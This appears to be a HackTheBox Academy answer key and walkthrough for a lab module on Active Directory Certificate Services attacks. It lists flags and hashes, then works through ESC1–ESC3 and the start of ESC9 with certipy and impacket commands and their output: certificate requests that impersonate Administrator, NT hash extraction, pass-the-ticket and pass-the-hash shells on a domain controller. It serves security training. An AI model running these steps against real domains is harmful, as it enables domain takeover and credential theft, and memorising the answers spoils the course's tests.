| Section | Question Number | Answer |
| --- | --- | --- |
| ESC1 | Question 1 | 2b576acbe6bcfda7294d6bd18041b8fe |
| ESC1 | Question 2 | HTB{ESC1\_4T7ACK} |
| ESC2 | Question 1 | 7dfa0531d73101ca080c7379a9bff1c7 |
| ESC2 | Question 2 | HTB{ESC2\_ATTACK} |
| ESC3 | Question 1 | S-1-5-21-2570265163-3918697770-3667495639-2602 |
| ESC3 | Question 2 | HTB{ESC3\_EKU} |
| ESC9 | Question 1 | ee22ddf0f8a66db4217050e6a948f9d6 |
| ESC9 | Question 2 | 01b60104db80993eb9ead5d8f9127eec |
| ESC9 | Question 3 | HTB{RESTR1CTED\_SHARE} |
| ESC10 | Question 1 | HTB{ESC10\_ATT4CK} |
| ESC6 | Question 1 | EDITF\_ATTRIBUTESUBJECTALTNAME2 |
| ESC6 | Question 2 | b9f1864b07e5fb180122e46b60f86f50 |
| ESC4 | Question 1 | EnrolleeSuppliesSubject |
| ESC4 | Question 2 | b4d7acc4ed8077f60a163499df9bc779 |
| ESC4 | Question 3 | HTB{ESC4\_MSPKI} |
| ESC7 | Question 1 | Josy |
| ESC7 | Question 2 | Juanmy |
| ESC7 | Question 3 | f0982e00d07f1329412df06ba5f6b67e |
| ESC5 | Question 1 | HTB{ESC5\_ACC3S5\_ABUS3} |
| ESC8 | Question 1 | fc9b9cb697c498cdce57e0566075435e |
| ESC8 | Question 2 | HTB{PR1V1l3DGE\_W17H\_RELAY} |
| ESC11 | Question 1 | HTB{C3R7IFICATE\_ABU53} |
| ESC11 | Question 2 | e1451fa7e5d10566074187fad7e8fe63 |
| Certifried (CVE-2022-26923) | Question 1 | HTB{C3rT1FRI3D\_VULNERABLE} |
| PKINIT | Question 1 | HTB{ADC$\_PK!N!T\_N0SUPP} |
| Skills Assessment | Question 1 | HTB{C3r7IFic47e\_F7W} |
| Skills Assessment | Question 2 | jimmy\_001 |
| Skills Assessment | Question 3 | HTB{C0mprOm1s3d\_D0ma1n} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# ESC1

## Question 1

### "Abuse the ESC1 misconfiguration and submit the Administrator's NT hash."

After spawning the target machine, students need to use `certipy` with the `find` command and the `-vulnerable` option to enumerate the ADCS CA for vulnerabilities, utilizing the credentials `blwasp@lab.local:Password123!`; students will discover that the `ESC1` template suffers from the `ESC1` misconfiguration:

Code: shell

```shell
certipy find -u blwasp@lab.local -p Password123! -dc-ip STMIP -vulnerable -stdout
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy find -u blwasp@lab.local -p Password123! -dc-ip 10.129.228.236 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 41 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Trying to get CA configuration for 'lab-LAB-DC-CA' via CSRA
[*] Got CA configuration for 'lab-LAB-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-LAB-DC-CA
    DNS Name                            : LAB-DC.lab.local
    Certificate Subject                 : CN=lab-LAB-DC-CA, DC=lab, DC=local
    Certificate Serial Number           : 16BD1CE8853DB8B5488A16757CA7C101
    Certificate Validity Start          : 2022-03-26 00:07:46+00:00
    Certificate Validity End            : 2027-03-26 00:17:46+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
<SNIP>
  4
    Template Name                       : ESC1
    Display Name                        : ESC1
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'LAB.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

Before abusing `ESC1`, students need to add vHost entries for the domain name `lab.local`, the CA's name `lab-LAB-DC-CA`, and its machine's DNS name `LAB-DC.lab.local` (which is also the DC's DNS name):

Code: shell

```shell
sudo sh -c 'echo "STMIP lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.228.236 lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

Subsequently, to abuse `ESC1`, students need to use the `req` command of `certipy`, specifying the template `ESC1` for the `-template` option and the `UPN` `Administrator` for the `-upn` option; students will attain a `PFX` certificate for the `Administrator` user:

Code: shell

```shell
certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template ESC1 -upn Administrator
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template ESC1 -upn Administrator

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 63
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `Administrator` and `Un-PAC-the-hash` within it; students will attain the NT hash `2b576acbe6bcfda7294d6bd18041b8fe`:

Code: shell

```shell
certipy auth -pfx administrator.pfx -domain lab.local
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy auth -pfx administrator.pfx -domain lab.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

Answer: `2b576acbe6bcfda7294d6bd18041b8fe`

# ESC1

## Question 2

### "What's the value of the flag file at C:\\Users\\Administrator\\Desktop\\flag.txt?"

From the previous question, students have attained the TGT for the `Administrator` user; therefore, using `wmiexec.py`, they need to `pass-the-ticket` to gain remote code execution on `LAB-DC.lab.local`:

Code: shell

```shell
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.lab.local
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.lab.local

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
lab\administrator
```

When reading the contents of the file `C:\Users\Administrator\Desktop\flag.txt`, students will attain the flag `HTB{ESC1_4T7ACK}`:

Code: cmd

```cmd
more "C:\Users\Administrator\Desktop\flag.txt"
```

```
C:\>more "C:\Users\Administrator\Desktop\flag.txt"

HTB{ESC1_4T7ACK}
```

Alternatively, students can `pass-the-hash` `2b576acbe6bcfda7294d6bd18041b8fe` with `wmiexec.py` and exfiltrate the contents of the file `C:\Users\Administrator\Desktop\flag.txt` directly:

Code: shell

```shell
wmiexec.py -no-pass -hashes :2b576acbe6bcfda7294d6bd18041b8fe administrator@LAB-DC.lab.local "more C:\Users\Administrator\Desktop\flag.txt"
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ wmiexec.py -no-pass -hashes :2b576acbe6bcfda7294d6bd18041b8fe administrator@LAB-DC.lab.local "more C:\Users\Administrator\Desktop\flag.txt"

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
HTB{ESC1_4T7ACK}
```

Answer: `HTB{ESC1_4T7ACK}`

# ESC2

## Question 1

### "Abuse the ESC2 misconfiguration and submit Matilda's NT hash."

After spawning the target machine, students need to use `certipy` with the `find` command and the `-vulnerable` option to enumerate the ADCS CA for vulnerabilities, utilizing the credentials `blwasp@lab.local:Password123!`; students will discover that the `ESC2` template suffers from the `ESC2` misconfiguration:

Code: shell

```shell
certipy find -u blwasp@lab.local -p Password123! -dc-ip STMIP -vulnerable -stdout
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy find -u blwasp@lab.local -p Password123! -dc-ip 10.129.228.236 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 41 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Trying to get CA configuration for 'lab-LAB-DC-CA' via CSRA
[*] Got CA configuration for 'lab-LAB-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-LAB-DC-CA
    DNS Name                            : LAB-DC.lab.local
    Certificate Subject                 : CN=lab-LAB-DC-CA, DC=lab, DC=local
    Certificate Serial Number           : 16BD1CE8853DB8B5488A16757CA7C101
    Certificate Validity Start          : 2022-03-26 00:07:46+00:00
    Certificate Validity End            : 2027-03-26 00:17:46+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
<SNIP>
  3
    Template Name                       : ESC2
    Display Name                        : ESC2
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Any Purpose
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'LAB.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
      ESC2                              : 'LAB.LOCAL\\Domain Users' can enroll and template can be used for any purpose
      ESC3                              : 'LAB.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
```

Before abusing `ESC2`, students need to add vHost entries for the domain name `lab.local`, the CA's name `lab-LAB-DC-CA`, and its machine's DNS name `LAB-DC.lab.local` (which is also the DC's DNS name):

Code: shell

```shell
sudo sh -c 'echo "STMIP lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.228.236 lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

Subsequently, to abuse `ESC2`, students need to use the `req` command of `certipy`, specifying the template `ESC2` for the `-template` option and the `UPN` `Matilda` for the `-upn` option; students will attain a `PFX` certificate for the `Matilda` user:

Code: shell

```shell
certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template ESC2 -upn Matilda
```

```
┌─[eu-academy-1]─[10.10.15.2]─[htb-ac-413848@htb-m83evvx77g]─[~]
└──╼ [★]$ certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template ESC2 -upn Matilda

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 68
[*] Got certificate with UPN 'Matilda'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'matilda.pfx'
```

Utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `Matilda` and `Un-PAC-the-hash` within it; students will attain the NT hash `7dfa0531d73101ca080c7379a9bff1c7`:

Code: shell

```shell
certipy auth -pfx matilda.pfx -domain lab.local
```

```
┌─[eu-academy-1]─[10.10.15.2]─[htb-ac-413848@htb-m83evvx77g]─[~]
└──╼ [★]$ certipy auth -pfx matilda.pfx -domain lab.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: matilda@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'matilda.ccache'
[*] Trying to retrieve NT hash for 'matilda'
[*] Got hash for 'matilda@lab.local': aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7
```

Answer: `7dfa0531d73101ca080c7379a9bff1c7`

# ESC2

## Question 2

### "Abuse the ESC2 misconfiguration to impersonate the Administrator account. What is the value of the flag file at C:\\Users\\matilda\\Desktop\\flag.txt?"

To abuse `ESC2` and impersonate the `Administrator` account, students need to use the `req` command of `certipy`, specifying the template `ESC2` for the `-template` option and the `UPN` `Administrator` for the `-upn` option; students will attain a `PFX` certificate for the `Administrator` user:

Code: shell

```shell
certipy req -u blwasp@lab.local -p Password123! -dc-ip STMIP -ca lab-LAB-DC-CA -template ESC2 -upn Administrator
```

```
┌─[eu-academy-1]─[10.10.15.2]─[htb-ac-413848@htb-m83evvx77g]─[~]
└──╼ [★]$ certipy req -u blwasp@lab.local -p Password123! -dc-ip 10.129.228.236 -ca lab-LAB-DC-CA -template ESC2 -upn Administrator

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 65
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `Administrator` and `Un-PAC-the-hash` within it; students will attain the NT hash `2b576acbe6bcfda7294d6bd18041b8fe`:

Code: shell

```shell
certipy auth -pfx administrator.pfx -domain lab.local
```

```
┌─[eu-academy-1]─[10.10.15.2]─[htb-ac-413848@htb-m83evvx77g]─[~]
└──╼ [★]$ certipy auth -pfx administrator.pfx -domain lab.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

With the TGT for the `Administrator` user attained, students need to `pass-the-ticket` with `wmiexec.py` to gain remote code execution on `LAB-DC.lab.local`:

Code: shell

```shell
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.lab.local
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.lab.local

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
lab\administrator
```

When reading the contents of the file `C:\Users\matilda\Desktop\flag.txt`, students will attain the flag `HTB{ESC2_ATTACK}`:

Code: cmd

```cmd
more "C:\Users\matilda\Desktop\flag.txt"
```

```
C:\>more "C:\Users\matilda\Desktop\flag.txt"

HTB{ESC2_ATTACK}
```

Alternatively, students can `pass-the-hash` `2b576acbe6bcfda7294d6bd18041b8fe` with `wmiexec.py` and exfiltrate the contents of the file `C:\Users\matilda\Desktop\flag.txt` directly:

Code: shell

```shell
wmiexec.py -no-pass -hashes :2b576acbe6bcfda7294d6bd18041b8fe administrator@LAB-DC.lab.local "more C:\Users\matilda\Desktop\flag.txt"
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ wmiexec.py -no-pass -hashes :2b576acbe6bcfda7294d6bd18041b8fe administrator@LAB-DC.lab.local "more C:\Users\matilda\Desktop\flag.txt"

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
HTB{ESC2_ATTACK}
```

Answer: `HTB{ESC2_ATTACK}`

# ESC3

## Question 1

### "Abuse the ESC3 misconfiguration to request a certificate on behalf of Haris. What is Haris's objectSID?"

After spawning the target machine, students need to use `certipy` with the `find` command and the `-vulnerable` option to enumerate the ADCS CA for vulnerabilities, utilizing the credentials `blwasp@lab.local:Password123!`; students will discover that the `ESC3` template suffers from the `ESC3` misconfiguration:

Code: shell

```shell
certipy find -u blwasp@lab.local -p Password123! -dc-ip STMIP -vulnerable -stdout
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy find -u blwasp@lab.local -p Password123! -dc-ip 10.129.228.236 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 41 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Trying to get CA configuration for 'lab-LAB-DC-CA' via CSRA
[*] Got CA configuration for 'lab-LAB-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-LAB-DC-CA
    DNS Name                            : LAB-DC.lab.local
    Certificate Subject                 : CN=lab-LAB-DC-CA, DC=lab, DC=local
    Certificate Serial Number           : 16BD1CE8853DB8B5488A16757CA7C101
    Certificate Validity Start          : 2022-03-26 00:07:46+00:00
    Certificate Validity End            : 2027-03-26 00:17:46+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
<SNIP>
1
    Template Name                       : ESC3
    Display Name                        : ESC3
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
    [!] Vulnerabilities
      ESC3                              : 'LAB.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
```

Before abusing `ESC3`, students need to add vHost entries for the domain name `lab.local`, the CA's name `lab-LAB-DC-CA`, and its machine's DNS name `LAB-DC.lab.local` (which is also the DC's DNS name):

Code: shell

```shell
sudo sh -c 'echo "STMIP lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.228.236 lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

Subsequently, to abuse `ESC3`, students first need to use the `req` command of `certipy`, specifying the template `ESC3` for the `-template` option; students will attain a `PFX` certificate for the `blwasp` user:

Code: shell

```shell
certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template ESC3
```

```
┌─[eu-academy-1]─[10.10.15.2]─[htb-ac-413848@htb-m83evvx77g]─[~]
└──╼ [★]$ certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template ESC3

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 71
[*] Got certificate with UPN 'blwasp@lab.local'
[*] Certificate object SID is 'S-1-5-21-2570265163-3918697770-3667495639-1103'
[*] Saved certificate and private key to 'blwasp.pfx'
```

Utilizing the certificate, students then need to use the `req` command of `certipy`, specifying the `User` template for the `-template` option, and the user `Haris` for the `-on-behalf-of` option; students will discover that `Haris`'s [objectSID](https://learn.microsoft.com/en-us/windows/win32/adschema/a-objectsid) is `S-1-5-21-2570265163-3918697770-3667495639-2602`:

Code: shell

```shell
certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template User -on-behalf-of Haris -pfx blwasp.pfx
```

```
┌─[eu-academy-1]─[10.10.15.2]─[htb-ac-413848@htb-m83evvx77g]─[~]
└──╼ [★]$ certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template User -on-behalf-of Haris -pfx blwasp.pfx

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 72
[*] Got certificate with UPN 'haris@lab.local'
[*] Certificate object SID is 'S-1-5-21-2570265163-3918697770-3667495639-2602'
[*] Saved certificate and private key to 'haris.pfx'
```

Answer: `S-1-5-21-2570265163-3918697770-3667495639-2602`

# ESC3

## Question 2

### "Abuse the ESC3 misconfiguration to impersonate the Administrator account. What is the value of the flag file at C:\\Users\\haris\\Desktop\\flag.txt?"

To abuse `ESC3` and impersonate the `Administrator` account, students need to use the `req` command of `certipy`, specifying the previously attained `PFX` certificate belonging to `blwasp` for the `-pfx` option , the `User` template for the `-template` option, and `Administrator` for the `-on-behalf-of` option; students will attain a `PFX` certificate for the `Administrator` user:

Code: shell

```shell
certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template User -on-behalf-of Administrator -pfx blwasp.pfx
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template User -on-behalf-of Administrator -pfx blwasp.pfx

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 69
[*] Got certificate with UPN 'Administrator@lab.local'
[*] Certificate object SID is 'S-1-5-21-2570265163-3918697770-3667495639-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

Utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `Administrator` and `Un-PAC-the-hash` within it; students will attain the NT hash `2b576acbe6bcfda7294d6bd18041b8fe`:

Code: shell

```shell
certipy auth -pfx administrator.pfx -domain lab.local
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy auth -pfx administrator.pfx -domain lab.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

With the TGT for the `Administrator` user attained, students need to `pass-the-ticket` with `wmiexec.py` to gain remote code execution on `LAB-DC.lab.local`:

Code: shell

```shell
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.lab.local
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.lab.local

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
lab\administrator
```

When reading the contents of the file `C:\Users\haris\Desktop\flag.txt`, students will attain the flag `HTB{ESC3_EKU}`:

Code: cmd

```cmd
more "C:\Users\haris\Desktop\flag.txt"
```

```
C:\>more "C:\Users\haris\Desktop\flag.txt"

HTB{ESC3_EKU}
```

Alternatively, students can `pass-the-hash` `2b576acbe6bcfda7294d6bd18041b8fe` with `wmiexec.py` and exfiltrate the contents of the file `C:\Users\haris\Desktop\flag.txt` directly:

Code: shell

```shell
wmiexec.py -no-pass -hashes :2b576acbe6bcfda7294d6bd18041b8fe administrator@LAB-DC.lab.local "more C:\Users\haris\Desktop\flag.txt"
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ wmiexec.py -no-pass -hashes :2b576acbe6bcfda7294d6bd18041b8fe administrator@LAB-DC.lab.local "more C:\Users\haris\Desktop\flag.txt"

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
HTB{ESC3_EKU}
```

Answer: `HTB{ESC3_EKU}`

# ESC9

## Question 1

### "Use certipy to takeover the account user2 with shadow credentials. What is the NT hash of user2?"

After spawning the target machine, students need to use `certipy` with the `find` command and the `-vulnerable` option to enumerate the ADCS CA for vulnerabilities, utilizing the credentials `blwasp@lab.local:Password123!`; students will discover that the `ESC9` template suffers from the `ESC9` misconfiguration:

Code: shell

```shell
certipy find -u blwasp@lab.local -p Password123! -dc-ip STMIP -vulnerable -stdout
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy find -u blwasp@lab.local -p Password123! -dc-ip 10.129.228.236 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 41 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Trying to get CA configuration for 'lab-LAB-DC-CA' via CSRA
[*] Got CA configuration for 'lab-LAB-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-LAB-DC-CA
    DNS Name                            : LAB-DC.lab.local
    Certificate Subject                 : CN=lab-LAB-DC-CA, DC=lab, DC=local
    Certificate Serial Number           : 16BD1CE8853DB8B5488A16757CA7C101
    Certificate Validity Start          : 2022-03-26 00:07:46+00:00
    Certificate Validity End            : 2027-03-26 00:17:46+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
<SNIP>
 0
    Template Name                       : ESC9
    Display Name                        : ESC9
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
